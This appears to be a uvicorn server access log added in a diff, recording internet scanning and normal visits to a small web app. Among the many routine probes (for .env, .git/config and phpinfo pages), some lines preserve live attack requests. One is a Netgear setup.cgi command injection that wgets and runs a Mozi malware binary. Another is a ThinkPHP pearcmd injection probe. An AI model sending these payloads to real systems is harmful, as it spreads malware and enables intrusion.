+INFO:     69.5.169.170:15050 - "GET /api/mcp HTTP/1.1" 404 Not Found
+INFO:     69.5.169.136:5998 - "GET /sse HTTP/1.1" 404 Not Found
+INFO:     104.237.145.228:3696 - "GET / HTTP/1.1" 200 OK
+INFO:     207.175.103.117:15090 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     109.105.209.29:11204 - "GET / HTTP/1.1" 200 OK
+INFO:     109.105.209.28:46602 - "GET /api/ HTTP/1.1" 404 Not Found
+INFO:     49.51.132.100:50072 - "GET / HTTP/1.1" 200 OK
+INFO:     217.60.21.17:50014 - "GET http%3A//azenv.net/ HTTP/1.1" 404 Not Found
+INFO:     71.6.155.70:51392 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.85:63500 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     39.98.55.206:52988 - "GET / HTTP/1.1" 200 OK
+INFO:     45.138.12.42:46576 - "GET /wp-content/plugins/contact-form-7/includes/css/styles.css HTTP/1.1" 404 Not Found
+INFO:     45.138.12.42:46576 - "GET /wp-content/plugins/contact-form-7/readme.txt HTTP/1.1" 404 Not Found
+INFO:     43.154.250.181:41496 - "GET / HTTP/1.1" 200 OK
+INFO:     192.248.150.180:33606 - "GET / HTTP/1.1" 200 OK
+INFO:     112.103.94.134:58739 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     106.14.80.184:42120 - "GET / HTTP/1.1" 200 OK
+INFO:     85.11.167.136:38826 - "GET / HTTP/1.1" 200 OK
+INFO:     85.11.167.136:38826 - "GET /message HTTP/1.1" 404 Not Found
+INFO:     85.11.167.136:38826 - "GET /setting HTTP/1.1" 404 Not Found
+INFO:     85.11.167.136:38826 - "GET /subpages/settingPage HTTP/1.1" 404 Not Found
+INFO:     85.11.167.136:38826 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     85.11.167.136:38826 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     193.8.186.31:33166 - "GET / HTTP/1.1" 200 OK
+INFO:     23.132.164.201:59712 - "GET /.env HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     85.155.14.61:64978 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:37688 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     198.235.24.36:62872 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     24.199.98.33:55280 - "GET / HTTP/1.1" 200 OK
+INFO:     43.130.154.56:46542 - "GET / HTTP/1.1" 200 OK
+INFO:     222.127.90.242:46788 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     103.162.40.87:42306 - "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 Not Found
+INFO:     86.171.199.125:38428 - "GET / HTTP/1.1" 200 OK
+INFO:     86.171.199.125:38444 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     45.153.34.230:35270 - "CONNECT ip-api.com%3A80 HTTP/1.1" 404 Not Found
+INFO:     45.153.34.230:35268 - "GET http%3A//ip-api.com/json/?fields=status,query,country,countryCode,isp,proxy,hosting HTTP/1.1" 404 Not Found
+INFO:     200.138.46.118:2400 - "GET / HTTP/1.1" 200 OK
+INFO:     64.205.72.105:1750 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     77.67.26.8:4222 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     77.67.26.58:12572 - "GET /mcp HTTP/1.1" 404 Not Found
+INFO:     86.38.187.63:3704 - "GET /api/mcp HTTP/1.1" 404 Not Found
+INFO:     200.138.46.37:13972 - "GET /mcp/ HTTP/1.1" 404 Not Found
+INFO:     64.205.72.72:9862 - "GET / HTTP/1.1" 200 OK
+INFO:     64.205.72.12:2610 - "GET /sse HTTP/1.1" 404 Not Found
+INFO:     3.86.139.107:15338 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     117.192.78.104:10819 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     172.110.223.103:41348 - "HEAD / HTTP/1.1" 405 Method Not Allowed
+INFO:     172.110.223.103:41372 - "HEAD / HTTP/1.1" 405 Method Not Allowed
+INFO:     137.184.226.250:48664 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     137.184.226.250:48674 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     112.124.10.86:46488 - "GET / HTTP/1.0" 200 OK
+INFO:     112.124.10.86:47102 - "GET /nmaplowercheck1795308434 HTTP/1.1" 404 Not Found
+INFO:     112.124.10.86:47130 - "POST /sdk HTTP/1.1" 404 Not Found
+INFO:     112.124.10.86:47108 - "GET / HTTP/1.0" 200 OK
+INFO:     112.124.10.86:47152 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+INFO:     112.124.10.86:47162 - "GET /evox/about HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     112.124.10.86:47772 - "GET / HTTP/1.0" 200 OK
+INFO:     112.124.10.86:47792 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:45876 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     176.65.148.230:34016 - "GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     176.65.148.230:34016 - "GET /phpMyAdmin-2.10.1.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     176.65.148.230:34016 - "GET /phpMyAdmin-2.10.2.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     176.65.148.230:34016 - "GET /phpMyAdmin-2.10.0.0/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     176.65.148.230:34016 - "GET /phpMyAdmin-2.10.0.1/scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     176.65.148.230:34016 - "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     196.249.206.9:42194 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     94.102.49.190:54852 - "GET / HTTP/1.1" 200 OK
+INFO:     94.102.49.190:54854 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:54866 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:54880 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:50724 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     103.130.215.120:42968 - "GET http%3A//azenv.net/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     35.206.141.112:30780 - "GET / HTTP/1.1" 200 OK
+INFO:     43.159.152.184:36234 - "GET / HTTP/1.1" 200 OK
+INFO:     164.92.145.194:33674 - "GET / HTTP/1.1" 200 OK
+INFO:     164.92.145.194:33674 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     40.67.178.198:44126 - "GET /hudson HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.128.13:45662 - "GET / HTTP/1.1" 200 OK
+INFO:     101.32.15.141:36438 - "GET / HTTP/1.1" 200 OK
+INFO:     47.97.103.223:54790 - "GET / HTTP/1.1" 200 OK
+INFO:     47.97.103.223:54794 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     115.52.188.37:40597 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
+INFO:     206.1.68.26:50659 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     45.135.193.193:43660 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:50946 - "GET / HTTP/1.1" 200 OK
+INFO:     91.92.40.4:50956 - "PROPFIND / HTTP/1.1" 405 Method Not Allowed
+INFO:     59.182.19.80:46806 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     157.230.88.27:41294 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:57683 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:58609 - "GET /info.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:58617 - "GET /test.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:60894 - "GET /php_info.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:60972 - "GET /php.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:59493 - "GET /i.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:59516 - "GET /pi.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:53568 - "GET /pinfo.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:53521 - "GET /check.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:52038 - "GET /php_version.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:52045 - "GET /phpversion.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:55550 - "GET /server-info.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:60572 - "GET /server.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:57055 - "GET /admin/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:52745 - "GET /admin/info.php HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:56766 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     93.152.221.156:56976 - "GET /debug/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     198.235.24.58:50622 - "GET / HTTP/1.0" 200 OK
+INFO:     152.42.241.142:50040 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     47.99.60.144:44792 - "GET / HTTP/1.1" 200 OK
+INFO:     47.99.60.144:44808 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     59.98.112.230:10030 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     43.166.142.76:44696 - "GET / HTTP/1.1" 200 OK
+INFO:     172.236.228.220:53162 - "GET / HTTP/1.1" 200 OK
+INFO:     1.24.16.207:34544 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.238:62986 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     91.92.40.4:30936 - "GET / HTTP/1.1" 200 OK
+INFO:     211.230.3.71:46002 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:42424 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:47232 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:33396 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:33238 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     185.223.235.47:44667 - "GET / HTTP/1.1" 200 OK
+INFO:     211.230.3.71:41328 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:57412 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:48032 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     20.127.165.135:41452 - "GET /developmentserver/metadatauploader HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:40614 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:42938 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:33228 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:50106 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     211.230.3.71:38692 - "GET /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=echo+K9ALPHA%3Becho+K9BETA HTTP/1.1" 404 Not Found
+INFO:     43.173.1.69:48562 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     95.214.54.159:46730 - "GET /css/common/master.css?v= HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     52.186.169.222:41638 - "GET /actuator/health HTTP/1.1" 404 Not Found
+INFO:     207.175.103.117:17854 - "GET / HTTP/1.1" 200 OK
+INFO:     123.245.84.33:29444 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.193.193:49098 - "CONNECT httpbin.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     205.210.31.253:61104 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     217.60.237.240:53482 - "GET http%3A//43.248.3.158%3A22222/ HTTP/1.1" 404 Not Found
+INFO:     59.180.128.200:47143 - "GET /boaform/adminformLogout//boaform/admin/login.asp HTTP/1.0" 404 Not Found
+INFO:     20.46.243.2:48286 - "GET / HTTP/1.1" 200 OK
+INFO:     48.102.206.68:18802 - "GET / HTTP/1.1" 200 OK
+INFO:     124.156.225.181:48320 - "GET / HTTP/1.1" 200 OK
+INFO:     178.62.249.79:52006 - "GET / HTTP/1.1" 200 OK
+INFO:     178.62.249.79:52006 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     172.236.228.224:22478 - "GET / HTTP/1.1" 200 OK
+INFO:     46.151.178.14:9596 - "GET / HTTP/1.1" 200 OK
+INFO:     46.151.178.14:9608 - "GET /autodiscover/autodiscover.xml HTTP/1.1" 404 Not Found
+INFO:     46.151.178.14:9616 - "GET /ews/exchange.asmx HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:35854 - "GET / HTTP/1.1" 200 OK
+INFO:     94.102.49.190:35860 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:35870 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:35874 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     94.102.49.190:35876 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41645 - "GET / HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41645 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41646 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41647 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41648 - "GET /static/img/shopping%20car.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41645 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41709 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41649 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41647 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE1.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41645 - "GET /static/img/%E6%A8%A1%E5%9E%8B%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41648 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE2.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41709 - "GET /static/img/%E9%93%83%E9%93%9B-1.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41649 - "GET /static/img/%E6%88%90%E5%93%81%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41646 - "GET /static/img/%E6%B8%B2%E6%9F%93%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41709 - "GET /static/img/%E9%BD%BF%E8%BD%AE.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41709 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE3.png HTTP/1.1" 200 OK
+INFO:     101.91.110.26:21458 - "GET / HTTP/1.1" 200 OK
+INFO:     101.91.110.26:21458 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     101.91.110.162:57750 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     101.91.110.133:8549 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     101.91.110.24:57927 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     101.91.110.133:54792 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     101.91.110.152:8890 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     101.91.110.26:21458 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     101.91.110.162:57750 - "GET /static/img/shopping%20car.png HTTP/1.1" 200 OK
+INFO:     101.91.110.133:8549 - "GET /static/img/%E9%BD%BF%E8%BD%AE.png HTTP/1.1" 200 OK
+INFO:     101.91.110.133:54792 - "GET /static/img/%E9%93%83%E9%93%9B-1.png HTTP/1.1" 200 OK
+INFO:     101.91.110.26:21458 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE1.png HTTP/1.1" 200 OK
+INFO:     101.91.110.162:57750 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE2.png HTTP/1.1" 200 OK
+INFO:     101.91.110.133:8549 - "GET /static/img/%E6%A8%A1%E5%9E%8B%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     101.91.110.24:57927 - "GET /static/img/%E6%B8%B2%E6%9F%93%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     101.91.110.133:54792 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE3.png HTTP/1.1" 200 OK
+INFO:     101.91.110.152:8890 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     101.91.110.164:8263 - "GET /static/img/%E6%88%90%E5%93%81%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.6:35688 - "GET / HTTP/1.1" 200 OK
+INFO:     27.115.124.6:35688 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     27.115.124.118:21193 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     27.115.124.6:35688 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     27.115.124.6:33137 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     27.115.124.118:8843 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     27.115.124.38:14547 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     27.115.124.45:43551 - "GET /static/img/shopping%20car.png HTTP/1.1" 200 OK
+INFO:     27.115.124.118:8843 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE2.png HTTP/1.1" 200 OK
+INFO:     27.115.124.6:33137 - "GET /static/img/%E9%93%83%E9%93%9B-1.png HTTP/1.1" 200 OK
+INFO:     27.115.124.38:14547 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE1.png HTTP/1.1" 200 OK
+INFO:     27.115.124.45:43551 - "GET /static/img/%E9%BD%BF%E8%BD%AE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.6:35688 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE3.png HTTP/1.1" 200 OK
+INFO:     27.115.124.118:21193 - "GET /static/img/%E6%A8%A1%E5%9E%8B%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.45:43551 - "GET /static/img/%E6%B8%B2%E6%9F%93%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.6:33137 - "GET /static/img/%E6%88%90%E5%93%81%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.53:50545 - "GET / HTTP/1.1" 200 OK
+INFO:     27.115.124.53:50545 - "GET / HTTP/1.1" 200 OK
+INFO:     101.91.110.14:29799 - "GET / HTTP/1.1" 200 OK
+INFO:     27.115.124.38:7449 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     27.115.124.70:33663 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     101.91.110.14:29799 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     101.91.110.26:56772 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     101.91.110.16:8807 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     101.91.110.162:61584 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     101.91.110.25:37620 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     101.91.110.153:40196 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     101.91.110.26:56772 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     101.91.110.16:8807 - "GET /static/img/shopping%20car.png HTTP/1.1" 200 OK
+INFO:     101.91.110.162:61584 - "GET /static/img/%E9%93%83%E9%93%9B-1.png HTTP/1.1" 200 OK
+INFO:     101.91.110.153:40196 - "GET /static/img/%E9%BD%BF%E8%BD%AE.png HTTP/1.1" 200 OK
+INFO:     101.91.110.14:29799 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE1.png HTTP/1.1" 200 OK
+INFO:     101.91.110.26:56772 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE2.png HTTP/1.1" 200 OK
+INFO:     101.91.110.16:8807 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE3.png HTTP/1.1" 200 OK
+INFO:     101.91.110.162:61584 - "GET /static/img/%E6%A8%A1%E5%9E%8B%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     101.91.110.25:37620 - "GET /static/img/%E6%B8%B2%E6%9F%93%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     101.91.110.153:40196 - "GET /static/img/%E6%88%90%E5%93%81%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     101.91.110.33:40709 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.70:33663 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     27.115.124.53:50545 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     27.115.124.6:52648 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     27.115.124.109:42552 - "GET /static/img/%E6%90%9C%E7%B4%A2.png HTTP/1.1" 200 OK
+INFO:     27.115.124.45:16547 - "GET /static/img/shopping%20car.png HTTP/1.1" 200 OK
+INFO:     27.115.124.101:16364 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     27.115.124.70:33663 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     27.115.124.6:52648 - "GET /static/img/%E9%93%83%E9%93%9B-1.png HTTP/1.1" 200 OK
+INFO:     27.115.124.70:33663 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE3.png HTTP/1.1" 200 OK
+INFO:     27.115.124.45:16547 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE2.png HTTP/1.1" 200 OK
+INFO:     27.115.124.53:50545 - "GET /static/img/%E6%A8%A1%E5%9E%8B%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.101:16364 - "GET /static/img/%E8%BD%AE%E6%92%AD%E5%9B%BE1.png HTTP/1.1" 200 OK
+INFO:     27.115.124.109:42552 - "GET /static/img/%E6%B8%B2%E6%9F%93%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.6:52648 - "GET /static/img/%E6%88%90%E5%93%81%E5%9B%BE.png HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41539 - "GET /docs HTTP/1.1" 200 OK
+INFO:     27.115.124.53:50545 - "GET /static/img/%E9%BD%BF%E8%BD%AE.png HTTP/1.1" 200 OK
+INFO:     27.115.124.109:21146 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.109:63371 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     36.21.86.135:41539 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     27.115.124.38:44318 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.6:26147 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.53:8253 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.70:54704 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     101.91.110.163:2275 - "GET /subpages/settingPage HTTP/1.1" 404 Not Found
+INFO:     101.91.110.163:2275 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     101.91.110.163:2275 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     123.6.49.44:34152 - "GET /subpages/settingPage HTTP/1.1" 404 Not Found
+INFO:     123.6.49.12:56826 - "GET /subpages/settingPage HTTP/1.1" 404 Not Found
+INFO:     123.6.49.50:59695 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     123.6.49.50:4125 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     36.21.86.135:41545 - "POST /api/users/info HTTP/1.1" 401 Unauthorized
+INFO:     27.115.124.38:6860 - "GET /docs HTTP/1.1" 200 OK
+INFO:     101.91.110.131:60869 - "GET /docs HTTP/1.1" 200 OK
+INFO:     27.115.124.101:21821 - "GET /docs HTTP/1.1" 200 OK
+INFO:     101.91.110.131:60869 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41732 - "POST /api/users/login HTTP/1.1" 200 OK
+INFO:     27.115.124.38:16353 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     27.115.124.38:16353 - "GET /static/subpages/loginPage.html HTTP/1.1" 200 OK
+INFO:     27.115.124.45:5264 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.53:27447 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     45.198.224.125:32876 - "GET / HTTP/1.1" 200 OK
+INFO:     36.21.86.135:41678 - "POST /api/users/info HTTP/1.1" 422 Unprocessable Entity
+INFO:     36.21.86.135:41617 - "POST /api/users/info HTTP/1.1" 401 Unauthorized
+INFO:     36.21.86.135:41685 - "POST /api/users/info HTTP/1.1" 401 Unauthorized
+INFO:     36.21.86.135:41637 - "POST /api/users/tokens HTTP/1.1" 200 OK
+INFO:     157.230.88.27:36508 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     74.249.178.182:42848 - "GET /druid/index.html HTTP/1.1" 404 Not Found
+INFO:     205.210.31.109:61098 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     160.187.146.57:5906 - "GET / HTTP/1.1" 200 OK
+INFO:     43.159.141.150:42474 - "GET / HTTP/1.1" 200 OK
+INFO:     172.104.74.45:2408 - "HEAD / HTTP/1.1" 405 Method Not Allowed
+INFO:     172.104.74.45:10644 - "GET /TS/export/pagedefinition?ID=1 HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10672 - "GET /get_rdf?comp=sdcust&locale_code=en-us HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10656 - "GET /info/dir?/ HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10698 - "GET /index.php/catalogsearch/advanced/result/?name=e HTTP/1.1" 404 Not Found
+INFO:     172.104.74.45:10650 - "GET /?static=1&order=asc HTTP/1.1" 200 OK
+INFO:     172.104.74.45:10686 - "GET / HTTP/1.1" 200 OK
